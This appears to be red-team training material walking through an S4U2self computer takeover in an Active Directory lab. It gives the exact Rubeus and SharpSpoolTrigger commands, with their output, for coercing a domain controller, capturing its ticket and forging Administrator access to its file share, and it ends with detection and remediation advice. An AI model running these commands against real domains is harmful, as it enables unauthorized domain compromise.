---
title: "S4U2Self Computer Takeover"
date: 2026-09-25
weight: 5
type: docs
tags:
  - Kerberos
  - S4U2Self
  - Coercion
  - Active Directory
---

## Targeting a computer directly

In the earlier discussion of unconstrained delegation, capturing a user's TGT depended on that user authenticating to a host under our control. When *nprentice*, who happened to be a domain administrator, connected to the CIFS service on a host configured for unconstrained delegation, we were able to lift their TGT from memory and replay it against the domain controller.

Real engagements rarely hand you that luck. You cannot count on a user, still less a domain admin, wandering onto the box while you sit watching for tickets. There are ways to bait that interaction, such as [seeding](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/) a share with files like `.lnk`, `.url`, `.library-ms`, and `.searchConnector-ms`, but every one of those still hinges on a human doing something. This article takes a more direct route: going after a computer, a domain controller included, on demand.

### Coercing authentication

A family of *remote authentication triggers* exists precisely to make one computer authenticate to another with no user involvement. Two of the best known are Lee Christensen's *SpoolSample*, which abuses the Print System Remote Protocol (MS-RPRN), and Topotam's *PetitPotam*, which abuses the Encrypting File System Remote Protocol (MS-EFSRPC).

So we start Rubeus watching for tickets on *hq-wks-07*:

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:5 /nowrap
```

Then use a tool such as [SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers) to compel *hq-dc-02* to authenticate back to *hq-wks-07*:

```powershell
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe hq-dc-02 hq-wks-07

NdrClientCall2x64
[-]RpcRemoteFindFirstPrinterChangeNotificationEx status: 6
```

Note that the trigger only needs to run as a standard domain user in a medium-integrity context.

Moments later, Rubeus captures the TGT of the coerced computer account:

```powershell
[*] 21/02/2025 11:54:39 UTC - Found new TGT:

  User                  :  HQ-DC-02$@ARCADIA.LOCAL
  StartTime             :  21/02/2025 10:39:21
  EndTime               :  21/02/2025 20:38:58
  RenewTill             :  28/02/2025 10:38:58
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFt[...snip...]5DT00=
```

### Why the raw TGT is not enough

It is tempting to think the job is done. Inject that ticket into a logon session, reach for CIFS, and you are met with access denied:

```powershell
beacon> run klist

Cached Tickets: (1)

#0>	Client: HQ-DC-02$ @ ARCADIA.LOCAL
	Server: krbtgt/ARCADIA.LOCAL @ ARCADIA.LOCAL
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize 
	Start Time: 2/21/2025 10:39:21 (local)
	End Time:   2/21/2025 20:38:58 (local)
	Renew Time: 2/28/2025 10:38:58 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: 

beacon> ls \\hq-dc-02\c$
[-] could not open \\hq-dc-02\c$\*: 5 - ERROR_ACCESS_DENIED
```

The reason is straightforward: a computer account is not granted local administrator rights over itself when it connects remotely. Holding the machine's TGT therefore is not the same as holding access to the machine. The way around this is S4U2self, which lets us mint a usable service ticket in the name of a *different*, impersonated user. The technique was first documented by [Elad Shamir](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html) and later folded into Rubeus by [Charlie Clark](https://exploit.ph/revisiting-delegate-2-thyself.html).

### The S4U2self takeover

Charlie's contribution added a `/self` switch to the Rubeus `s4u` command:

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/hq-dc-02 /ticket:doIFt[...snip...]5DT00= /nowrap
```

Where:

- `/impersonateuser` is the user to impersonate.
- `/self` tells Rubeus to skip the S4U2proxy request.
- `/altservice` is the SPN to substitute into the resulting service ticket.
- `/ticket` is the computer's TGT.

```powershell
[*] Action: S4U

[*] Building S4U2self request for: 'HQ-DC-02$@ARCADIA.LOCAL'
[*] Using domain controller: hq-dc-02.arcadia.local (172.16.40.10)
[*] Sending S4U2self request to 172.16.40.10:88
[+] S4U2self success!
[*] Substituting alternative service name 'cifs/hq-dc-02'
[*] Got a TGS for 'Administrator' to 'cifs@ARCADIA.LOCAL'
[*] base64(ticket.kirbi):

      doIF/[...snip...]kYy0x
```

The S4U2self request here mirrors what we saw with constrained delegation under Kerberos-only authentication: it asks for a ticket in the impersonated user's name where the service is the computer's own sAMAccountName (in effect *Administrator@HQ-DC-02$*). Ordinarily that ticket would then feed an S4U2proxy request, but there is no constrained delegation configured here to allow that. Instead, Rubeus simply rewrites the service name to whatever was passed in `/altservice`, producing *Administrator@cifs/hq-dc-02*. This is viable because the CIFS service runs in the context of the computer account (that is, SYSTEM), so the encrypted portion of the ticket remains decryptable by that same key.

With the rewritten ticket loaded, the C$ share opens as expected:

```powershell
beacon> run klist

Cached Tickets: (1)

#0>	Client: Administrator @ ARCADIA.LOCAL
	Server: cifs/hq-dc-02 @ ARCADIA.LOCAL
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x60a50000 -> forwardable forwarded renewable pre_authent ok_as_delegate name_canonicalize 
	Start Time: 2/21/2025 12:42:53 (local)
	End Time:   2/21/2025 20:38:58 (local)
	Renew Time: 2/28/2025 10:38:58 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0 
	Kdc Called: 

beacon> ls \\hq-dc-02\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/24/2025 13:33:39   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     05/08/2021 08:20:24   PerfLogs
          dir     01/23/2025 15:46:17   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     02/21/2025 11:06:13   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/29/2025 10:42:20   System Volume Information
          dir     01/24/2025 13:33:21   Users
          dir     01/24/2025 13:49:56   Windows
 12kb     fil     02/21/2025 02:38:14   DumpStack.log.tmp
 1gb      fil     02/21/2025 02:38:14   pagefile.sys
```

At this point the domain controller's file system is fully readable as Administrator, achieved without any user ever interacting with the attacker-controlled host.

## Detection and remediation

The chain above joins two weaknesses that are best addressed separately. The coercion step relies on protocols that many environments do not need exposed: disable the Print Spooler service on servers that do not print, and block or restrict MS-EFSRPC where it is not required, so that tools in the SpoolSample and PetitPotam families have nothing to talk to. The delegation step depends on a machine account TGT reaching an attacker-controlled host in the first place, so removing unnecessary unconstrained delegation and hardening which hosts hold it cuts off the supply of coerced tickets. On the monitoring side, watch for a computer account authenticating to an unexpected peer and for S4U2self activity that substitutes an alternate service name, both of which stand out against normal traffic. Placing tier-0 assets behind authentication policies and Protected Users further limits how far a coerced or impersonated ticket can travel.

## Further reading

- [Elad Shamir: Wagging the Dog](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [Charlie Clark: Revisiting Delegate 2 Thyself](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [MDSec: Farming for Red Teams, harvesting NetNTLM](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/)
- [SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers)
- [GhostPack Rubeus documentation](https://github.com/GhostPack/Rubeus)